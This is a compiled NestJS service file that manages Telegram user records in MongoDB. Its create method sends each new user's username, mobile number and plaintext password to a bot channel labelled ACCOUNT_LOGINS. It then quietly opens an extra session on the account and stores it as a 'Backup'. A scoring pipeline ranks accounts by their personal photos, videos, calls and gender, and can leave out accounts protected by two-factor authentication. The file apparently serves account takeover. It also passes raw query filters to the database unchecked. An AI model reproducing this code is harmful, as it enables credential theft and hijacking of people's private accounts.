"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.UsersService = void 0;
const Telegram_service_1 = require("./../Telegram/Telegram.service");
const common_1 = require("@nestjs/common");
const mongoose_1 = require("@nestjs/mongoose");
const mongoose_2 = require("mongoose");
const client_service_1 = require("../clients/client.service");
const connection_manager_1 = require("../Telegram/utils/connection-manager");
const bots_1 = require("../bots");
let UsersService = class UsersService {
    constructor(userModel, telegramService, clientsService, botsService) {
        this.userModel = userModel;
        this.telegramService = telegramService;
        this.clientsService = clientsService;
        this.botsService = botsService;
    }
    async create(user) {
        const activeClientSetup = this.telegramService.getActiveClientSetup();
        console.log("New User received - ", user?.mobile);
        console.log("ActiveClientSetup::", activeClientSetup);
        if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
            console.log("Updating New Session Details", user.mobile, user.username, activeClientSetup.clientId);
            await this.clientsService.updateClientSession(user.session);
        }
        else {
            await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_LOGINS, `ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`, undefined, false);
            setTimeout(async () => {
                try {
                    await connection_manager_1.connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
                    const newSession = await this.telegramService.createNewSession(user.mobile);
                    const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: "Backup" });
                    await newUserBackup.save();
                }
                catch (error) {
                    console.log("Error in creating new session", error);
                }
            }, 3000);
            const newUser = new this.userModel(user);
            return newUser.save();
        }
    }
    async findAll() {
        return this.userModel.find().exec();
    }
    async findOne(tgId) {
        const user = await (await this.userModel.findOne({ tgId }).exec())?.toJSON();
        if (!user) {
            throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
        }
        return user;
    }
    async update(tgId, user) {
        delete user['_id'];
        const result = await this.userModel.updateMany({ tgId }, { $set: user }, { upsert: true }).exec();
        if (result.matchedCount === 0) {
            throw new common_1.NotFoundException(`Users with tgId ${tgId} not found`);
        }
        return result.modifiedCount;
    }
    async updateByFilter(filter, user) {
        delete user['_id'];
        const result = await this.userModel.updateMany(filter, { $set: user }, { upsert: true }).exec();
        if (result.matchedCount === 0) {
            throw new common_1.NotFoundException(`Users with tgId ${JSON.stringify(filter)} not found`);
        }
        return result.modifiedCount;
    }
    async delete(tgId) {
        const result = await this.userModel.deleteOne({ tgId }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
        }
    }
    async deleteById(userId) {
        const result = await this.userModel.deleteOne({ _id: userId }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`User with id ${userId} not found`);
        }
    }
    async search(filter) {
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        if (filter.twoFA !== undefined) {
            filter.twoFA = filter.twoFA === 'true' || filter.twoFA === '1' || filter.twoFA === true;
        }
        return this.userModel.find(filter).sort({ updatedAt: -1 }).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.userModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    async getTopInteractionUsers(options) {
        const { page = 1, limit = 20, minScore = 0, minCalls = 0, minPhotos = 0, minVideos = 0, excludeExpired = true, excludeTwoFA = false, gender } = options;
        const pageNum = Math.max(1, Math.floor(page));
        const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100);
        const skip = (pageNum - 1) * limitNum;
        const weights = {
            ownPhoto: 8,
            ownVideo: 12,
            otherPhoto: 3,
            otherVideo: 5,
            totalPhoto: 2,
            totalVideo: 3,
            incomingCall: 15,
            outgoingCall: 8,
            videoCall: 20,
            totalCalls: 1,
            movieCount: -10,
        };
        const filter = {};
        if (excludeExpired) {
            filter.expired = { $ne: true };
        }
        if (excludeTwoFA) {
            filter.twoFA = { $ne: true };
        }
        if (gender) {
            filter.gender = gender;
        }
        if (minCalls > 0) {
            filter['calls.totalCalls'] = { $gte: minCalls };
        }
        if (minPhotos > 0) {
            filter.$or = [
                { photoCount: { $gte: minPhotos } },
                { ownPhotoCount: { $gte: minPhotos } },
                { otherPhotoCount: { $gte: minPhotos } }
            ];
        }
        if (minVideos > 0) {
            filter.$or = [
                ...(filter.$or || []),
                { videoCount: { $gte: minVideos } },
                { ownVideoCount: { $gte: minVideos } },
                { otherVideoCount: { $gte: minVideos } }
            ];
        }
        const pipeline = [
            { $match: filter },
            {
                $addFields: {
                    photoScore: {
                        $cond: {
                            if: { $gt: ['$ownPhotoCount', 0] },
                            then: { $multiply: ['$ownPhotoCount', weights.ownPhoto] },
                            else: {
                                $cond: {
                                    if: { $gt: ['$otherPhotoCount', 0] },
                                    then: { $multiply: ['$otherPhotoCount', weights.otherPhoto] },
                                    else: {
                                        $cond: {
                                            if: { $gt: ['$photoCount', 0] },
                                            then: { $multiply: ['$photoCount', weights.totalPhoto] },
                                            else: 0
                                        }
                                    }
                                }
                            }
                        }
                    },
                    videoScore: {
                        $cond: {
                            if: { $gt: ['$ownVideoCount', 0] },
                            then: { $multiply: ['$ownVideoCount', weights.ownVideo] },
                            else: {
                                $cond: {
                                    if: { $gt: ['$otherVideoCount', 0] },
                                    then: { $multiply: ['$otherVideoCount', weights.otherVideo] },
                                    else: {
                                        $cond: {
                                            if: { $gt: ['$videoCount', 0] },
                                            then: { $multiply: ['$videoCount', weights.totalVideo] },
                                            else: 0
                                        }
                                    }
                                }
                            }
                        }
                    },
                    callScore: {
                        $let: {
                            vars: {
                                incomingVal: { $ifNull: ['$calls.incoming', 0] },
                                outgoingVal: { $ifNull: ['$calls.outgoing', 0] },
                                videoVal: { $ifNull: ['$calls.video', 0] },
                                totalCallsVal: { $ifNull: ['$calls.totalCalls', 0] }
                            },
                            in: {
                                $add: [
                                    {
                                        $cond: {
                                            if: { $gt: ['$$incomingVal', 0] },
                                            then: { $multiply: ['$$incomingVal', weights.incomingCall] },
                                            else: 0
                                        }
                                    },
                                    {
                                        $cond: {
                                            if: { $gt: ['$$outgoingVal', 0] },
                                            then: { $multiply: ['$$outgoingVal', weights.outgoingCall] },
                                            else: 0
                                        }
                                    },
                                    {
                                        $cond: {
                                            if: { $gt: ['$$videoVal', 0] },
                                            then: { $multiply: ['$$videoVal', weights.videoCall] },
                                            else: 0
                                        }
                                    },
                                    {
                                        $cond: {
                                            if: {
                                                $and: [
                                                    { $eq: ['$$incomingVal', 0] },
                                                    { $eq: ['$$outgoingVal', 0] },
                                                    { $gt: ['$$totalCallsVal', 0] }
                                                ]
                                            },
                                            then: { $multiply: ['$$totalCallsVal', weights.totalCalls] },
                                            else: 0
                                        }
                                    }
                                ]
                            }
                        }
                    },
                    movieScore: {
                        $cond: {
                            if: { $gt: ['$movieCount', 0] },
                            then: { $multiply: ['$movieCount', weights.movieCount] },
                            else: 0
                        }
                    }
                }
            },
            {
                $addFields: {
                    interactionScore: {
                        $round: [
                            {
                                $divide: [
                                    {
                                        $add: [
                                            '$photoScore',
                                            '$videoScore',
                                            '$callScore',
                                            '$movieScore'
                                        ]
                                    },
                                    1
                                ]
                            },
                            2
                        ]
                    }
                }
            },
            {
                $match: {
                    interactionScore: { $gte: minScore }
                }
            },
            { $sort: { interactionScore: -1 } },
            {
                $facet: {
                    totalCount: [{ $count: 'count' }],
                    paginatedResults: [
                        { $skip: skip },
                        { $limit: limitNum }
                    ]
                }
            },
            {
                $project: {
                    total: { $ifNull: [{ $arrayElemAt: ['$totalCount.count', 0] }, 0] },
                    users: '$paginatedResults'
                }
            }
        ];
        const result = await this.userModel.aggregate(pipeline, { allowDiskUse: true }).exec();
        if (!result || result.length === 0) {
            return {
                users: [],
                total: 0,
                page: pageNum,
                limit: limitNum,
                totalPages: 0
            };
        }
        const aggregationResult = result[0];
        const totalUsers = aggregationResult.total || 0;
        const users = aggregationResult.users || [];
        const cleanedUsers = users.map((user) => {
            const { photoScore, videoScore, callScore, movieScore, ...cleanUser } = user;
            return cleanUser;
        });
        const totalPages = Math.ceil(totalUsers / limitNum);
        return {
            users: cleanedUsers,
            total: totalUsers,
            page: pageNum,
            limit: limitNum,
            totalPages
        };
    }
};
exports.UsersService = UsersService;
exports.UsersService = UsersService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('userModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        client_service_1.ClientService,
        bots_1.BotsService])
], UsersService);
//# sourceMappingURL=users.service.js.map